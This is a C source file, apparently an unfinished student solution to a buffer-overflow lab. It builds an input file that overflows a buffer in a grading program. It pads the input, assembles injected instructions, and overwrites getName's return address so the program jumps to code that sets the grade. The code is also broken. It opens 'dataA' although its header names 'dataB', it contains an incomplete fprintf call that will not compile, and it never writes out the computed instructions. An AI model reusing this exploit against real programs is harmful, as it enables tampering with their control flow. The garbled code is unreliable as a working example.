/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <miniassembler.h>


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 49 bytes to a file called dataB and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr;
    unsigned int adrInstr;
    unsigned int strbInstr;
    unsigned int bInstr;
    psFile = fopen("dataA", "w");
    /* 15 bytes */
    fprintf(psFile, "Ishaan and Jack");
    /* Writes 00000000 = 1 byte*/
    fprintf(psFile, "%c", '\0'); 


    movInstr = MiniAssembler_mov(0, 'A');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    strbInstr = MiniAssembler_strb(0, 1);
    bInstr = MiniAssembler_b(0x400870, 0x420074);


    fprintf(psFile, )
    
    /* 16 bytes */
    fprintf(psFile, "1234567812345678");


    /* We want to replace getName's return address
     with 0x400858 (address to grade = 'b' instructions 
     in text section)*/
    fprintf(psFile, "%c", 0x58);
    fprintf(psFile, "%c", 0x08);
    fprintf(psFile, "%c", 0x40);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}